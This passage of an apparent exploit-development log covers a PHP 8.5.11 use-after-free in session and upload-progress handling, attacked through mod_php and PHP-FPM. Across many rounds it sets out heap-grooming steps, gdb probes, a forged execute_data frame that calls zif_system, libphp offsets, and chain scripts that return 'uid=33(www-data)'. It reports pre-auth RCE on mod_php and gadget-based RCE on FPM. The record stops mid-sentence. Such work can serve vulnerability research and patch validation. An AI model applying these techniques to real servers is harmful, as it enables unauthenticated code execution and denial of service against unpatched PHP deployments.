INIT lock=0 level=1 data=0x...27f000
0x...27f000: 0x0000001600000001 0x0000000000000000  (zend_string gc, hash)
0x...27f010: 0x0000000000001000 0xfffffffffffffffe  (len=0x1000, attacker data)
```

`last_dtor` becomes 0x1000; the session decode calls `var_tmp_var()`, which
dereferences it:

```
SIGSEGV in var_tmp_var
var_tmp_var <- ps_srlzr_decode_php <- php_session_initialize
  <- php_session_rfc1867_update <- rfc1867_post_handler <- sapi_handle_post
```

FPM logs `child N exited on signal 11 (SIGSEGV)`; the master respawns.
Reliability: 5/5 on freshly restarted workers, plus 6/6 in the packaged runner
across restarts. Two immediate retries on respawned workers missed the reclaim
(free-list layout), so the trigger is deterministic per fresh worker, not per
retry.

### Why FPM RCE was not reached here

The calif slot primitive is reachable in the source (`tmp_var`, negative signed
`used_slots` -> `ZVAL_COPY` at `block+16+16*used_slots`), but the minimal trigger
blocks it:

1. Any large allocation that reclaims the 2-page dtor block splits the coalesced
   `[d][dtor]` run from the front and clobbers `d` first, destroying the only
   pointer to the dtor block. `d` cannot be clobbered before it is used.
2. Reclaiming `d` with a `zend_string` exposes attacker bytes only from offset
   0x18; `last`/`first_dtor`/`last_dtor` are read from the engine-written header.

A controlled slot write needs the dtor block reclaimed while `d` stays valid,
which requires an address leak or a non-coalescing layout (an application
allocation live between them). The page used here has no leak sink
(`<?php echo "OK\n";`); the advisory's FPM RCE is explicitly
application-dependent. Demonstrated FPM impact: unauthenticated worker SIGSEGV
(DoS). Package: `fpm/` (`README.md`, `run_fpm_repro.sh`, `send_b.py`,
`mk_a_payload.py`, `probe-unser.gdb`, `zz-single.conf`).


## Round 11 — framework-style sinks; FPM leak line

Added app endpoints matching common framework patterns and verified them:

- `www/progress.php`: `session_start()` + `json_encode($_SESSION)` (upload-progress poll).
- `www/session_write.php`: session controller storing request data and references.
- `www/cache.php`: base64 cookie -> `unserialize()` -> JSON (cache/meta read).
- `www/upload.php`: multipart field echo (form preview sink).
- `www/fpm_plant.php`: session writer modes (long key/value, nested bomb, S2 references).
- `www/fpm_key_oom.php`: runtime memory_limit, optional pad, `session_start()`.

Smoke: progress `{"p":"hello"}`, cache `{"a":1,"b":"two"}`, upload echo OK.

FPM stale-BG status: producer (session_start decode OOM) and consumer
(upload-progress decode before Basic RINIT) remain stable. A multi-variable
session layout keeps both the stale struct chunk and the destructor chunk
mapped across requests; the remaining work is landing a body allocation on the
stale `var_dtor_entries` while `d` stays valid, to set `used_slots` negative.
Plan under test: a large form field that cannot fit the main chunk is placed in
the cached chunk holding the long key and destructor block; a negative slot
rewrites the form field's `zend_string` length, letting `upload.php` leak heap
through the echoed field. Blocked on cached-chunk order: the main chunk is
consumed first and `get_chunk` pops chunks in allocation order, so `d`'s chunk
is reached before the destructor chunk.

## Round 12 — serialize-handler mismatch primitive (config + gadget, not a php2shell FPM RCE)

Correction: this chain requires a per-directory serialize-handler mismatch
(configuration) and an application gadget class whose destructor executes the
command; the `Evil` class is a contrived lab gadget. It demonstrates the
session-confusion primitive and its survival on 8.5.12, not a stock or
app-agnostic FPM RCE.

Technical record:

- `/chainW` (`.user.ini`: `session.serialize_handler=php_serialize`) stores the
  raw `PHP_SESSION_UPLOAD_PROGRESS` value in the session file.
- `/chainR` (`php`) splits at the `|` inside that string and unserializes the
  `x|O:4:"Evil":...` object; the trailing data fails the decode and
  `Evil::__destruct` runs `system($cmd)`.
- Single worker + `session.upload_progress.cleanup=0`: `fpm/chain_c.py 9001 id`
  -> `uid=33(www-data) ...`.
- Default `cleanup=On`, two workers, nginx `fastcgi_request_buffering off`:
  `fpm/chain_c_stall.py 9001 id` returns the same `id` output from a stalled
  partial upload; the two-request sequence without the stall fails.
- `php:8.5.12-fpm` also returns `uid=33(www-data)`: the memory patch does not
  close this chain because the read is an application `session_start()`, not the
  pre-RINIT update the fix's incomplete-class mode covers.

Native `BG(unserialize)` UAF status on FPM: unchanged (worker SIGSEGV,
attacker-influenced reclaim). The destructor-block reclaim is blocked by chunk
allocation order: `d` is allocated before the destructor block, cached chunks
are popped in allocation order, and reaching a cached chunk requires filling the
main chunk, which clobbers `d`. No native FPM RCE demonstrated.

Risk summary: mod_php = native pre-auth RCE on stock production config. The FPM
native memory bug = unauthenticated worker crash and state corruption; no native
RCE demonstrated. The handler-mismatch chain is a config-dependent
session-confusion primitive with an application gadget, not a php2shell FPM RCE.

## Round 13 — progress-value injection + include sink (LFI composition, not php2shell)

Correction: `www/view.php` includes `$_GET['tpl']` and is already vulnerable
application code; upload_progress only seeds it with a PHP payload. This is an
LFI composition, not a php2shell RCE, and is excluded from the risk verdict. An
application with that include sink is already exploitable without any php2shell
bug.

Technical record: `fpm/chain_a.py 9001 id` returns the `system('id')` output
inside the included `/tmp/sess_<sid>`
(`upload_progress_uid=33(www-data) ...`).

RCE evidence for php2shell remains the mod_php native chain. The FPM native
memory UAF stays crash-only.

## Round 14 — pre-RINIT session gadget: FPM RCE on 8.5.11, blocked in 8.5.12

The upload-progress session decode runs before RINIT. On 8.5.11 it resolves
classes and runs magic methods; a preloaded gadget class executes from a
session object during any multipart upload-progress request, with no
`session_start()` in the target script and no serialize-handler mismatch.

Setup: `opcache.preload` defines `Evil::__wakeup()` (system on a property);
`preload_store.php` stores `new Evil($_POST['cmd'])` in the session; the trigger
sends `PHPSESSID=<sid>` plus `PHP_SESSION_UPLOAD_PROGRESS` to `/index.php`.

- 8.5.11: `/tmp/preproof` contains `uid=33(www-data)`.
- 8.5.12: same session record and trigger, no proof; the fix's
  incomplete-class mode keeps the object as `__PHP_Incomplete_Class`
  (`ext/session/tests/rfc1867_no_user_code.phpt` is the fix test).

Conditions: a preloaded class with a usable magic method and an app that stores
an object of that class in the session (application POP chain). The trigger is
core and is closed by 8.5.12; this is application-dependent but a direct
pre-RINIT code-execution primitive on FPM, distinct from the post-RINIT handler
chain.

Native `BG(unserialize)` UAF remains crash-only.

## Round 15 — three-path deep dive: fix scope, prefork pinning, FPM write

See `APPROACHES.md` for the consolidated version.

### 15.1 CVE-2026-109618 is not an object-handler patch

`git diff php-8.5.11..php-8.5.12` for the executor/parser files:
`Zend/zend_alloc.c`, `Zend/zend_execute_API.c`, `Zend/zend_hash.c`,
`Zend/zend_vm_def.h`, `main/php_variables.c`, `main/rfc1867.c`,
`main/SAPI.c`, `main/main.c`, `ext/session/session.c`. Commit
`31c0ea7d7ff` does **not** touch `Zend/zend_object_handlers.c`. The only
recent object-handler commit is `83c17e31494` (GH-21776, unrelated).

`zend_std_read_property()`'s `__get` call at
`Zend/zend_object_handlers.c:243` goes through `zend_call_function()`. In
8.5.11 the call API sets `EG(fake_scope)=NULL` (line 1004) and restores it
(line 1065); an OOM inside `__get` skips the restore, but the stale value is
NULL, not a class. 8.5.12 adds the delayed-OOM check in
`zend_call_function()` and the VM, so the restore runs. The property handlers
are call sites, not the fix.

The real stale executor state is the pre-`init_executor()` shutdown:
`EG(user_error_handler)`, `EG(user_exception_handler)`, `EG(exception)`,
`EG(error_handling)`, `EG(objects_store)`. `zend_shutdown_executor_values()`
resets them (the startup-OOM path). FPM exits on a failed request startup;
mod_php keeps the worker, which is the `display_errors=Off` chain. A
script-level `__get` OOM on FPM is a worker-surviving DoS; `init_executor()`
resets `EG(fake_scope)` on the next request. No new cross-request primitive.

Remaining 109618 work: `path1_hash/` partial bucket (trigger reproduced;
bin-320 `arData` groom not landed) and `path2_autostart/` (stale state, no
pre-RINIT consumer).

### 15.2 Off chain re-verified on stock ini and on prefork

`p2s-8511-off`, single `apache2 -X`, stock `php.ini-production`:

```
A1 body=1064604 resp=222 status='HTTP/1.0 500 Internal Server Error'
B1 main=0x74ef68a00000 libphp=0x74ef65400000
RCE OK
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

New `p2s-8511-prefork` uses `lab/mpm_prefork_4.conf` (4 workers). Three
partial chunked POSTs blocked three workers; the fourth served all four
requests:

```
pin 0/1/2: worker blocked
A1 500
B1 main=0x7f6a07800000 libphp=0x7f6a04200000
RCE OK uid=33(www-data)
```

The stock `MaxRequestWorkers=150` case needs 149 pinned connections; same
mechanism. Offsets unchanged: `zval_ptr_dtor=libphp+0x7b47a0`,
`zif_system=libphp+0x5996e0`, `hsv=main+0x7c720`, `S=main+0xF7398`.

### 15.3 FPM `BG(unserialize)`: gdb-controlled write

The FPM lab (`p2s-fpm-8511`, `p2s-nginx-8511`, port 9002/9003) reproduced
the 4096-byte filename SIGSEGV. The new probe `fpm/probe-dreclaim.gdb` and
`fpm/fcgi_dreclaim.py` were used for the raw-filename d-reclaim.

A (`fpm_sess_oom.php`, S1 1.19 MB array) leaves
`d=0x7b617dc7f000` with `last_dtor=0x7b617dc82000` (d+0x3000). B
(`fcgi_dreclaim.py`, 3-page filename) sees the A's `d` intact:

```
INIT level=1 data=0x7b617dc7f000
D bytes: last=d+0x38 first_dtor=last_dtor=d+0x2000
```

The 3-page raw filename did not reclaim `d`. A 5-page raw filename
(`fcgi_dreclaim.py 9003 <sid> 5 0`) matches the 5-page coalesced `d`+dtor run
and **does** reclaim `d`. At the second session init at
`d=0x7b6a2b67f000` the `d` bytes are the raw `0x52` filler, and the gdb patch
(`last_dtor=d+0x3000`, `used_slots=-2`) writes the decoded S2 integer 12345 at
`d+0x2FF0`. The raw's fake header was at the raw offset **0x120** in the
parser's view.

A `var_destroy()` fake-array route was considered but is **not reachable** in
the stale-`d` reuse. `php_var_unserialize_destroy()` calls `var_destroy()` only
when `BG(unserialize).level == 1`. The A leaves the stale `d` at level 1; the
B's `php_var_unserialize_init()` raises it to 2; the destroy lowers it to 1
without running `var_destroy()`. The fake array's `pDestructor` is never
called. The active primitive remains `tmp_var()` with a negative `used_slots`.

Function-table scan for `zif_system`: `EG+456` gives `FT`, its `arData` and
1212 buckets. Bucket 0 has the key at +24 pointing at an interned `.rodata`
string. The `system` string was not found by the current scanner, and the
stripped binary has no `zif_system` symbol. The fire still needs the FPM
libphp base and the FPM `zif_system` offset.

A gdb patch of `last_dtor=d+0x100` and `used_slots=-2` also made `tmp_var()`
return `target=d+0xF0`; the decoded S2 integer 12345 appeared there:

```
TMP target=0x7b617dc7f0f0
0x7b617dc7f0f0: 0x0000000000003039
DESTROY level=2
```

So the negative-slot write is real. The missing step is controlling
`last_dtor` without gdb. The 4096-byte filename reclaims `d` with a
`zend_string` and sets `last_dtor=0x1000`, which crashes in `var_tmp_var`.
Next: occupy the 2-page dtor block with a live 2-page `zend_string` (pre-field)
before a 2-page raw filename, so the raw bytes own `d->last_dtor`; or force a
chunk-boundary split with a `2 MiB - 3 pages - overhead` allocation before
`session_start()`.

Target formula: `last_dtor + 16 + 16*used_slots`. To forge a `zend_string`
length write at `str+8` (the zval value lands at `str+0x10`); to forge a
HashTable destructor write at `pDestructor-8`. The decoded session value is
attacker-controlled. A second A with `headers_sent` can set `send_cookie=1`
while the first A's `d` persists, for the `PS(id)` `Set-Cookie` leak.

### 15.4 Lab housekeeping

Removed: `p2s-dbg`, `p2s-gdb2`, `p2s-path2`, `p2s-repro`, `p2s-8512-lab`,
`p2s-8511-lab`, `p2s-8426`, `p2s-8512`, `p2s-8511`, `p1v`, `p2s-extract`.
Kept: `p2s-8511-off`, `p2s-8511-prefork`, `p2s-fpm-8511`, `p2s-nginx-8511`,
`p2s-fpm` (8.5.12 control), `p2s-nginx`. Files added:
`lab/mpm_prefork_4.conf`, `fpm/nginx-8511.conf`, `fpm/fcgi_dreclaim.py`,
`fpm/probe-dreclaim.gdb`, `APPROACHES.md`.

## Round 16 — FPM `zif_system` call mechanics verified (gdb-assisted, 3/3)

Goal: turn the round-15 write primitive into a `system()` call on the FPM worker.
The target is the session array: `zend_array_destroy()` of
`PS(http_session_vars)` calls `zend_hash_destroy()`, which calls
`pDestructor(&bucket->val)`. Pointing `pDestructor` at `zif_system` makes the
bucket val address the `execute_data`.

### 16.1 First attempt and the 60 s hang

`fpm/probe-fire2.gdb` set `pDestructor = zif_system` and wrote the frame at
`arData` inside `php_session_flush()`. The request then hung until
`max_execution_time` (60+2 s) and no proof file appeared. The watchdog probe
(`probe-fire3.gdb`: SIGINT 8 s after the frame write, `bt` from a
`gdb.events.stop` handler) gave:

```
WATCH kick pid=19
Thread 2.1 "php-fpm" received signal SIGINT, Interrupt.
#0  zend_hash_find ()
#1  ?? (session.c serializer encode)
#2  php_session_flush ()
#3  ?? (rfc1867 callback)
#4  rfc1867_post_handler ()
#5  sapi_handle_post ()
#6  php_default_treat_data ()
#7  zend_activate_auto_globals ()
#8  php_hash_environment ()
#9  php_request_startup ()
```

The session array is encoded (`php_session_save_current_state()` →
`php_get_session_var()`) *after* the flush breakpoint. The frame write put
`num_args = 1` at `arData + 0x2C`, which is bucket 1's `zval.u2.next` (the hash
chain link). `zend_hash_find()` at `7e18d3` reads that link and re-enters
bucket 1 forever. The hang was self-inflicted, not a `func` problem.

### 16.2 Correct write point

`zend_array_destroy()` only routes through `zend_hash_destroy()` when
`pDestructor != ZVAL_PTR_DTOR`, and it makes that decision at entry. Write
`pDestructor` and the frame at `zend_array_destroy` entry (and again at
`zend_hash_destroy` entry), never before the encode. No lookups follow, so the
chain corruption is harmless.

### 16.3 Frame layout that works (PHP 8.5.11, x86-64)

```
v + 0x00  opline = 0
v + 0x08  call = 1        (bucket val type_info -> IS_NULL, must be non-UNDEF)
v + 0x10  return_value = 0
v + 0x18  func = real zend_function* (not read by system()'s happy path)
v + 0x20  This.value = 0
v + 0x28  This.type_info = 0
v + 0x2C  num_args = 1
v + 0x30..0x48 0
v + 0x50  arg0.value = fake zend_string
v + 0x58  arg0.type_info = 6
```

`zend_execute_data` is 0x50 bytes; `ZEND_CALL_FRAME_SLOT` is 5, so arg 1 is at
`frame + 0x50`. The fast parameter API (`ZEND_PARSE_PARAMETERS_START` /
`Z_PARAM_PATH_STR`) reads `EX_NUM_ARGS()` and `ZEND_CALL_ARG(execute_data, 1)`
from the handler's rdi, not from `EG(current_execute_data)`. The fake
`zend_string` went at `arData + nTableSize*32 - 0x30` (`+0xE0` for
`nTableSize = 8`), inside the bucket allocation; `+0x100` is past it.

### 16.4 Result

`fpm/probe-fire4.gdb` + `fpm/run_fire4.sh`:

```
FLUSH ht=...c2d8 ar=...67c0 n=2 nt=8 pd=zval_ptr_dtor
ADEST ht=...c2d8 n=2
FRAME array_destroy ... q2c=0x1 q50=...6890 q58=0x6
DESTHT ht=...c2d8 pd=zif_system
FRAME hash_destroy ...
SYSE e=...67c0 na=1 arg0=...6890 at=6
[Detaching after vfork from child process 21]
```

`/tmp/fpm5_proof` = `uid=33(www-data) gid=33(www-data) groups=33(www-data)`,
3/3 runs with different ASLR bases. One run continues into `php_exec` and
SIGSEGVs writing `return_value` (rsi = NULL) after the command; the proof is
already on disk and FPM respawns the worker.

### 16.5 Native-chain boundary

The reclaiming allocation is the file-part name as a `zend_string`: its header
(gc / h / len) covers `d + 0x00..0x17`, so `d->last_dtor` becomes the string
length. Attacker bytes start at `d + 0x18`. The probe patches `d` under gdb;
without a heap leak there is no absolute `last_dtor`, `zif_system`, or string
pointer. A bare `<?php echo "OK\n";` endpoint has no leak sink, so the native
FPM chain remains application-dependent. The post-leak half is now verified.

Files: `fpm/probe-fire3.gdb` (watchdog diagnostics), `fpm/probe-fire4.gdb`,
`fpm/run_fire4.sh`; `fpm/fcgi_dreclaim.py` NULL-`last` fix.

## Round 17 — chunk split for the dtor reclaim; native leak boundary

Goal: land the 5121-byte rfc1867 read buffer (attacker bytes at offset 0) on the
stale `var_dtor_entries` block so `used_slots` becomes negative without gdb.

### 17.1 Chunk split works

A page with a pad before `session_start()` moves `d` to a chunk tail and the
dtor block to another chunk. Pad sweep (S1 + S2 creation in the sequence,
`fpm_sess_split.php?pad=N`), `d` offsets in 0x8000 steps:

```
pad=0        d off 0x1b3000   ldt off 0x8d000   (same chunk, separate)
pad=0x8000   d off 0x1a9000   ldt = d+0x3000
pad=0x10000  d off 0x1b1000   ldt = d+0x3000
...
pad=0x60000  d off 0x1f9000   ldt = d+0x3000
pad=0x68000  d off 0xde000    ldt = d+0x3000   (new chunk)
```

The last row before the jump leaves a 0x?000 tail; the block is not coalesced
with `d`. A second sweep with the pad at 0x5C000 gave `d` at 0x1FD000 and the
dtor block at the next chunk's first page (`ldt_off=0x1000`).

### 17.2 The reclaim chooses the run start

At the B's first 5121-byte `_ecalloc`, the main chunk's `free_map` (offset
0x210 in the chunk header) had 98 allocated pages and one free run starting at
the startup frontier. Best-fit allocation takes the run's *start*, not the
freed dtor block inside it. The dtor block landed at 0x8d000 while the buffer
took 0x62000.

A hole+pad groom was tried to put the dtor block at the run start:

```
www/fpm_sess_split2.php: alloc 4128-byte hole, alloc pad, unset(hole),
                         session_start() under memory_limit=4M
```

With a 1.65 MB pad the pad itself moved to a new chunk (`ptr=0x...a01000`),
the session read (1.19 MB) took the main-chunk free run, `d` and the dtor block
followed adjacently. The pad must instead fit the main chunk exactly and leave
2 pages, which requires knowing the request startup frontier (it varied between
0x62 and 0x92 pages across container restarts). The 200 KB truncated-array
session record (`p|a:100000:{` + 200 KB, passing `IS_FAKE_ELEM_COUNT`) also
allows a smaller read buffer, but the same run-start rule applies.

### 17.3 Write window

`tmp_var` computes `block + 0x10 + 16*used_slots`:

- positive `used_slots` (0..254) stays inside the 0x1010-byte block, which is
  the attacker-owned multipart buffer: no effect outside it.
- negative `used_slots` reaches at most 0x1000 bytes below the block, i.e. the
  chunk header page when the block is at the run start, or the preceding
  allocation otherwise.
- the written 16 bytes are a refcounted decoded value: a heap pointer plus type
  (6/7/10), not a small integer. Forging a bounded string length is impossible
  with this value.
- the only response-visible string, `PS(id)`, is created and its `Set-Cookie`
  queued in `php_session_reset_id()` *before* `php_session_decode()`, and the
  header copies the id; later corruption cannot change it.
- `PS(id)` is reset by `php_rshutdown_session_globals()` after every successful
  request; the A is a post-startup OOM, so no session globals survive into B.
  `BG(unserialize)` is the only persistent stale state.

### 17.4 Conclusion

The native FPM chain needs an information leak. A bare endpoint has no sink for
one; the relative write cannot reach a response-relevant structure. The
verified post-leak half is `probe-fire4.gdb`/`run_fire4.sh` (Round 16). An
application reflector (session echo, JSON poll of `$_SESSION`, error/log
exposure) would supply the leak; without it the FPM impact remains a worker
crash (DoS) or an app-gadget session RCE (Rounds 12/14).

Files: `www/fpm_sess_split.php`, `www/fpm_sess_split2.php`,
`www/fpm_sess_raw.php` (lab writer), `fpm/fcgi_split.py`,
`fpm/probe-split*.gdb`, `fpm/probe-chunks.gdb`, `fpm/probe-alloc.gdb`.

### 17.5 Frontier mismatch and the header-pad idea

The hole+pad groom did place the dtor block at the *A's* startup frontier
(`ldt_off=0x92000` with `pad=1490900 hole=4096`), but the B's buffer allocation
happens in `php_hash_environment` before the script compile, so its frontier is
lower (0x62 in earlier traces; the A's script allocations had advanced it to
0x92). The block therefore sat inside the B's free run, not at its start.

Attempt to align the B's frontier with a large FastCGI header
(`HTTP_X_PAD`, params split across records) before the multipart buffer:
`fpm/fcgi_split.py <port> <sid> <preamble> <padlen>`. The A's layout drifted
after the first iteration, and header sizes >=100 KB made the FastCGI client
lose the response (FPM logged 200), so the measurement is incomplete. The idea
is sound: the header string is allocated in `php_hash_environment` before the
POST parse and shifts the buffer's run start by its page count.

## Round 18 — FPM RSHUTDOWN producer and the response-sink inventory

### 18.1 Flush OOM at RSHUTDOWN does not leave PS stale

Tested a new producer: the script stores a ~1.85 MB string in `$_SESSION`
under `memory_limit=4M`; the session *write* at `PHP_RSHUTDOWN(session)` hits
OOM in `smart_str_erealloc` (bailout stack), the response is already 200, and
the worker survives.

Probe `fpm/probe-ps.gdb` (break `php_session_reset_id`, print
`ps_globals+0x10` id and the `http_session_vars` zval at +0x168):

```
A: RESET ... id=0x...a8c000 http_vars=0x0       http_type=0
A: BAIL  ... id=0x...a8c000 http_vars=0x...031c0 http_type=0x30a
B: RESET ... id=0x...a6b040 http_vars=0x...031c0 http_type=0
```

The type is `IS_UNDEF` (0) in the B while the value qword is the stale
reference: `php_rshutdown_session_globals()` did run after the flush bailout and
`ZVAL_UNDEF` clears only the type. `php_session_track_init` therefore skips the
dtor, and the B creates a fresh reference. FPM does not get the mod_php
`PS(http_session_vars)` UAF through this producer.

### 18.2 Response-sink inventory (bare endpoint)

Post-decode writes cannot reach the HTTP response:

- `Set-Cookie` is built in `php_session_reset_id()` from `PS(id)` via
  `php_url_encode` + `estrndup` before the session data is read and decoded.
- `X-Powered-By`, `Content-Type`, session cache-limiter headers and the script
  literal are static or built before the decode.
- PHP diagnostics go through `sapi_cgi_log_message` -> `zlog_msg` (FPM log),
  not the FastCGI STDOUT/STDERR streams.
- The only session data written after the decode is the session file, which a
  bare endpoint never reads back.

A response-visible leak would need a dynamic header produced after the stale
decode; no such header exists. This matches the public analyses: the FPM path
"depends on a suitable application operation" and a real-server RCE needs "a
sink, a leak and heap grooming" (calif write-up, santi ANALYSIS.md).

Files: `www/fpm_flush_oom.php`, `fpm/probe-ps.gdb`.

## Round 19 — app-independent FPM consumer: PHP_VALUE diagnostics destroy the stale fatal backtrace

### 19.1 Finding

`fatal_error_backtraces` defaults to On in 8.5. A fatal error records
`EG(last_fatal_error_backtrace)` (an array) in the request heap. When the fatal
leaves the shutdown unclean, `zend_shutdown_executor_values(fast_shutdown=1)`
does not dtor it (the `!fast_shutdown` branch owns the dtor in 8.5.11). The
array survives the request; the worker keeps the address.

On the next request, `zend_error_zstr_at` clears `last_fatal_error_backtrace`
before the normal executor initialization, on *any* error path that reaches it.
FPM applies attacker-supplied `PHP_VALUE` / `PHP_ADMIN_VALUE` FastCGI params
before `php_request_startup()`, so an invalid setting such as
`memory_limit=abc` produces an early `E_WARNING` and consumes the stale zval.

Reproduction (single FPM worker under gdb, `fpm/probe-bt.gdb`):

```
A: GET /fpm_flush_oom.php?n=2150000        -> 500 (E_ERROR OOM)
   ERRAT type=1 "Allowed memory size ... exhausted"
   TRACE ht=0x...c268                       (backtrace formatted for the log)
B: raw FastCGI GET with PHP_VALUE=memory_limit=abc
   ERRAT type=2 "Invalid "memory_limit" setting ..."
   ADESTROY_STALE ht=0x...c268
   #0 zend_array_destroy
   #1 zend_error_zstr_at
   #3 zend_error
   #9 zend_parse_ini_string
```

Then `zend_mm_heap corrupted` and SIGABRT inside `zend_array_destroy` (the
freed HashTable is destroyed again). The worker is replaced by the master.

This is the advisory's INI-diagnostic consumer, reproduced on PHP-FPM. It is
app-independent on the consumer side and needs no `session_start()`; it requires
an attacker-reachable fatal producer (the A; an application decode/OOM or any
unclean fatal) and a frontend that forwards client-controlled
`PHP_VALUE`/`PHP_ADMIN_VALUE` (direct FastCGI access or a permissive proxy), which
is the conditional exposure the advisory lists for FPM.

### 19.2 Primitive shape

`zval_ptr_dtor(stale zval)` -> `zend_array_destroy(stale_ht)`. If the freed
HashTable is reclaimed before the warning, its `nNumUsed`, `pDestructor`,
`arData`, flags and buckets are attacker bytes; `pDestructor != ZVAL_PTR_DTOR`
routes to `zend_hash_destroy(ht)` and calls `pDestructor(&bucket->val)`, the same
call shape as the verified Round 16 frame (fast `z_param` reads rdi).
The reclaim window is the B's pre-init allocations: the `PHP_VALUE` string
(`spprintf`), the INI parser structures, and the FastCGI params. The stale ht
address comes from the A's `TRACE ht` and is engine-held, not attacker-known.

The remaining wall is unchanged: the fake table needs `pDestructor = zif_system`
and a fake string/frame pointer, i.e. PIE/ASLR recovery. This consumer makes the
pre-init controlled-destroy reachable without sessions; it does not by itself
supply a memory disclosure.

Files: `fpm/fcgi_ini.py`, `fpm/probe-bt.gdb`, `www/fpm_flush_oom.php`.

### 19.3 Deterministic lab setup

`setarch -R` works inside the container with `--security-opt seccomp=unconfined`
(the gdb "Error disabling address space randomization" is only the default
seccomp profile blocking `personality`). Under `setarch -R gdb ...`, the layout
is fixed: the fatal backtrace array is at `ht=0x7ffff625c268` and the
`PHP_VALUE` `spprintf` buffer at `0x7ffff6203000` on every run.

The stale `ht` is a 0x38-byte HashTable-struct slot (`0x268` is a multiple of
0x38) in the chunk reused by the next request. A 55-byte `PHP_VALUE` string
allocates a 0x38-bin buffer but on a different bin page (`0x...203000`), so it
does not reclaim the slot on the first request. Reclaiming `ht` needs pre-init
grooming with the FastCGI params/INI buffers; the params buffer is
`name\0value\0` pairs, so zero fields of a fake HashTable can be aligned with
the separators.

### 19.4 POST-warning consumer is out of the window

The stale fatal backtrace is also reset by `init_executor()`:

```c
/* zend_execute_API.c, init_executor() */
ZVAL_UNDEF(&EG(last_fatal_error_backtrace));
```

`php_request_startup()` calls `zend_activate()` -> `init_executor()` *before*
`sapi_activate()` and `php_hash_environment()`, so a warning during POST parsing
(`Input variables exceeded 1000`, tested with `fpm/fcgi_post.py`) no longer sees
the stale array. Only the pre-startup INI diagnostics (`PHP_VALUE` /
`PHP_ADMIN_VALUE`, applied in FPM's `init_request_info`) reach it.

### 19.5 Why the INI consumer does not give a controlled call

`init_request_info` builds the INI text with
`spprintf(&tmp, 0, "%s\n", ini)`, i.e. `zend_vspprintf` -> `smart_string` ->
`emalloc` text. The buffer is NUL-terminated text: the value cannot contain a
NUL byte. A fake HashTable needs NUL bytes in its pointer fields (`arData`,
`pDestructor`, frame/string pointers on x86-64), so the text reclaim can only
produce a controlled free/UAF, not a valid fake table with a chosen
`pDestructor`. The original struct fields (if left partially intact) carry
`ZVAL_PTR_DTOR`, the normal destroy path.

Conclusion: the INI backtrace consumer is a real, app-independent pre-init UAF
and worker abort on FPM, conditional on attacker-supplied FastCGI
`PHP_VALUE`; it is not by itself an RCE path. The validated FPM RCE remains the
session/generic-unserializer path (application-dependent producer) from
Rounds 15-16.

Files: `fpm/fcgi_post.py`, `fpm/probe-bt.gdb`.

## Round 20 — native dtor-block reclaim attempt via `_GET`

### 20.1 Deterministic split

Under `setarch -R` the Round 17 hole+pad groom reproduces exactly:

```
A: d=0x7ffff63b8000 (chunk 0x7ffff6200000, off 0x1b8000)
   dtor block ldt=0x7ffff6292000 (off 0x92000, 2 pages)
```

The A's 4096-byte hole was allocated at 0x92000 and freed before
`session_start()`; the dtor block then took the same 2-page run. At the B, the
freed run still contains the hole's `0x41` bytes, so `ldt` reads as
`u=0x4141414141414141`.

### 20.2 Query-string allocations do not land on the run

`_GET` is created before `_POST` (`php_startup_auto_globals()` order), so query
string allocations can shift the multipart buffer's run. Tested with
`q=<50 KB value>&a0=v..a999=v` (`fpm/fcgi_split.py` args 5/6). Results:

- the 50 KB decoded value lands in the chunk at 0x78000 (marker at 0x78018),
  not on the 0x92000 run;
- the 5121-byte multipart buffer lands at 0x5d000/0x62000, i.e. the allocator
  picks a lower exact 2-page run first;
- a 50 KB value cannot be a FastCGI param: `fcgi_get_params()` parses one
  record at a time and a name/value pair cannot span records, so each param is
  capped at ~65520 bytes (196 KB headers are rejected outright).

### 20.3 Next allocation-order step

The multipart buffer is the right shape: 5121 bytes = 2 pages, raw body data at
offset 0 (so the frame preamble can set `used_slots = -2` at the run start).
What remains is making 0x92000 the *lowest exact 2-page free run* at the
`multipart_buffer_new()` allocation. `_GET` has to consume the lower 2-page runs
first: candidate controls are the `$_GET` bucket table size (number of query
vars, `max_input_vars`), the number of URL-encoded array keys, and extra query
allocations whose sizes fall on 2-page runs.

Files: `fpm/fcgi_split.py` (query args, marker), `fpm/probe-split4.gdb`
(ENT/MARK/DUMP).

## Round 21 — native dtor-slot write via `_GET` reclaim (verified)

### 21.1 Setup

Under `setarch -R`, with the Round 17 groom, the freed dtor run is at
`0x7ffff6292000`. Ten 5000-byte query values (`v0..v9`) are allocated by the
`_GET` auto-global before `_POST`; one 2-page value string lands with its
header at `0x7ffff6291000`, data at `0x7ffff6291018`, covering the dtor run.
The value at data offset `0xFE8` (= `0x92000 - 0x91018`) is therefore the
dtor block's `used_slots`.

Each value carries `00 ff ff ff ff ff ff ff` (-256) at that offset, encoded in
the query string.

### 21.2 Result (no gdb writes)

```
INIT level=1 d=0x7ffff63b8000 ldt=0x7ffff6292000
  ENT u=-256 next=0x5151...
  HDR 0x7ffff6291000: ... 8813000000000000 5151...   (len=5000, data)
INIT level=1 ... ldt=0x7ffff6292000
  ENT u=-255 next=0x5151...
  HDR 0x7ffff6291000: ... 3930000000000000 0000...   (len=12345)
```

`ps_srlzr_decode_php()` calls `var_tmp_var()` before decoding each session
value; it reads our -256, writes at `block + 0x10 - 0x1000 = 0x91010` (the
value string's length field) and copies the decoded session value there. With
S2 = `p|i:12345;` the forged length is the bounded integer `12345`; with a
string value it is the decoded string's heap pointer.

This is the calif destructor-slot primitive on FPM with no gdb patching: the
attacker query value reclaims the freed dtor block and controls `used_slots`.

### 21.3 Sink status

A reflected-GET page (`www/echo.php`) sees all `v0..v9` values with length
5000; `strlen()` and the echoed bytes show the original 5000-byte strings, so
the string at `0x91000` whose length was forged is a copy/orphan, not the zval
the script reads. The next step is to locate the stored `$_GET` value's string
(the zval in the symbol table / `zif_strlen` argument) and aim `used_slots` at
its header, which turns the forged length into an OOB read in the response.
The target must satisfy `0x92010 - 16*used_slots = stored_str + 0x10`.

Files: `fpm/fcgi_split.py` (query args + -256 pattern + script/resp args),
`www/echo.php`, `fpm/probe-split4.gdb`.

## Round 22 — stored GET strings vs the dtor run

Resolved the `bin2hex` internal handler via the function table
(`EG+456` -> `zend_hash_str_find("bin2hex")` -> `zif_handler` at `fn+0x58`) and
dumped the first argument of every call. The ten stored `$_GET` value strings
under the Round 21 sequence are:

```
0x7ffff6273000 0x7ffff6277000 0x7ffff627b000 0x7ffff627f000
0x7ffff6283000 0x7ffff6287000 0x7ffff628b000 0x7ffff628f000
0x7ffff6298000 0x7ffff629c000
```

Each is a 2-page zend_string (data at +0x18, len 5000). The dtor run at
`0x7ffff6292000` is not covered by any stored string's data (the string at
